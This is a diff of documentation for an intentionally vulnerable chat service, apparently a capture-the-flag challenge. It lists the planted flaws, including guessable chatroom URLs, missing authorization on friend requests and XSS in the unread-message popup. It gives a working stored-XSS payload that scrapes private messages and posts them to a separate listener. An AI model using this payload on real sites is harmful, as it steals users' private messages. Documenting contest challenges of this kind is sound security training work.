@@ -1,7 +1,8 @@
 Service documentation
 ======================
 # Service Structure
-![Service Structure](Service%20Structure.svg)
+![Service Structure](Service%20Structure.svg)  
+
 Register, Login requests and the home page are handled by the server.js. All other requests are routed to separate controllers. The controllers use models to interact with the database. The views are rendered using ejs templates.
 # Functionality
 - Chatrooms
@@ -30,13 +31,13 @@ Friend requests can be sent or accepted by anyone. This allows anyone to view an
     get http://localhost:3000/chatrooms/secret
 ### Intended Fixes
 1. Change URL generation to be independent of the chatroom name.
-2. Add check that the user sending the request is the same as the userName in the request body. And check that the user accepting the request is the same as the partner in the request body.
+2. Add check that the user sending the friend request is the same as the userName in the request body. Also check that the user accepting the friend request is the same as the partner in the request body of the friend request initiation.
 ## Cross-Site Scripting (XSS)
 
 - Category: XSS
 - Difficulty: Medium
 
-The new private message popup is vulnerable to XSS. The message is not sanitized and can be used to execute arbitrary JavaScript code.
+The unread private message popup is vulnerable to XSS. The message is not sanitized and can be used to execute arbitrary JavaScript code.
 The checker uses a headless browser to retrieve the flag from the private messages, and will load through as many unread messages as possible.
 ### Exploit
     post http://localhost:3000/messages body: {"recipient":"foo", "message":"<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://localhost:6452/', {method: 'POST', body:'flag=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"}
